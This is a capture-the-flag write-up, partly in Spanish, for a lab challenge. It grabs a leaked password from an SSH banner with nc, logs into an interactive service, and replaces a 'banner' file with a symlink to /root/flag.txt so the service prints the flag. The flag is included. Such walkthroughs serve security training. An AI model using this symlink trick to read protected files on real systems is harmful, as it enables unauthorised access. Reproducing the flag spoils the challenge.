## Descripción

Can you abuse the banner? The server has been leaking some crucial information on `chatelaine.cylabacademy.net 44304`. Use the leaked information to get to the server.

To connect to the running application use `nc chatelaine.cylabacademy.net 30072`. From the above information abuse the machine and find the flag in the /root directory.

- Do you know about symlinks?
- Maybe some small password cracking or guessing

## Solución

```
1. Obtener la contraseña filtrada desde el banner del puerto 44304
nc chatelaine.cylabacademy.net 44304
Salida: SSH-2.0-OpenSSH_9.6p1 My_Passw@rd_@1234

2. Conectarse al servicio interactivo en el puerto 30072
nc chatelaine.cylabacademy.net 30072
Respondiendo las preguntas de acceso:
- Password: My_Passw@rd_@1234
- Top cyber security conference: DEF CON
- First hacker / phreaker: John Draper

3. Dentro de la shell interactiva (player@challenge), reemplazar el archivo banner por un enlace simbólico a la flag
rm banner
ln -s /root/flag.txt banner

4. En una nueva terminal, realizar una nueva conexión al servicio para que lea e imprima la flag
nc chatelaine.cylabacademy.net 30072
```

```
academy{b4nn3r_gr4bb1n9_su((3sfu11y_d3ce8df1}
```

## Notas adicionales

## Referencias